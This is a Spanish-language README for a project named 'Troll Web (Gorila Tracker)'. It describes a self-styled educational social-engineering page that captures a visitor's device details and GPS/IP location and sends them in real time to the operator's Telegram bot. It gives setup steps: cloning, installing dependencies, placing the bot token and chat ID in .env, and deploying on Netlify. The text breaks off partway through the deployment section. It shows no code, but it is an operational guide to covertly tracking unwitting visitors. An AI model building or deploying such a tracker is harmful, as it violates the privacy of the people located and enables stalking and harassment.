# 🦍 Proyecto Troll Web (Gorila Tracker)

Este es un sistema de ingeniería social con fines educativos que permite capturar información técnica y ubicación (GPS/IP) de un dispositivo, enviando los reportes en tiempo real a un bot de Telegram.

## 📋 Requisitos Previos

Antes de comenzar, asegúrate de tener instalado:
* **Node.js** (v18 o superior).
* **Git** configurado en tu equipo.
* **Netlify CLI** (si prefieres desplegar por terminal): `npm install -g netlify-cli`.

---

## 🛠️ Paso 1: Configuración Local

1. **Clonar el repositorio:**
    ```bash
    git clone https://github.com/Antonio-SeGa/troll-web-project.git
    cd troll-web-project

2. **Instalar dependencias:**
Este paso es vital para que la función `logger.js` funcione.
    ```bash
    npm install

3. **Configuración de Variables de Entorno (.env):**
Crea un archivo llamado `.env` en la raíz del proyecto para realizar pruebas locales (aunque para Netlify se configuran en su panel).
    ```bash
    TELEGRAM_TOKEN=tu_token_de_botfather
    TELEGRAM_CHAT_ID=tu_id_personal

## 🚀 Paso 2: Despliegue en Netlify
Tienes dos formas de poner el sitio en línea:

### **Opción A: Por Netlify CLI (Recomendado)**
Esta opción es más rápida si ya tienes el proyecto en tu computadora.
1. ****
